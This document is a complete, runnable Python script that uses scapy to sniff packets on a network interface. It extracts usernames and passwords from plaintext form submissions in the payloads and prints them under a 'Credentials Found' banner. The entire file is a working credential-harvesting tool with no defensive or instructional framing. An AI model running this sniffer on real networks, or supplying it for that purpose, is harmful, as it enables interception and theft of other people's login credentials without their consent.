from scapy.all import *
from urllib import parse
import re

iface = "eth0"


def get_login_pass(body):

    user = None
    passwd = None

    userfields = ['login', 'username', 'user', 'email']
    passfields = ['password', 'pass', 'pwd']

    for login in userfields:

        login_re = re.search(login + r'=([^&]+)', body, re.IGNORECASE)

        if login_re:
            user = login_re.group(1)

    for passfield in passfields:

        pass_re = re.search(passfield + r'=([^&]+)', body, re.IGNORECASE)

        if pass_re:
            passwd = pass_re.group(1)

    if user and passwd:
        return (user, passwd)


def pkt_parser(packet):

    if packet.haslayer(Raw):

        body = packet[Raw].load.decode(errors="ignore")

        user_pass = get_login_pass(body)

        if user_pass != None:

            print("\n[+] Credentials Found")
            print("User:", parse.unquote(user_pass[0]))
            print("Pass:", parse.unquote(user_pass[1]))
            print("---------------------------------")


try:
    sniff(iface=iface, prn=pkt_parser, store=0)

except KeyboardInterrupt:
    print("\nClosing Password Sniffer...")
    exit()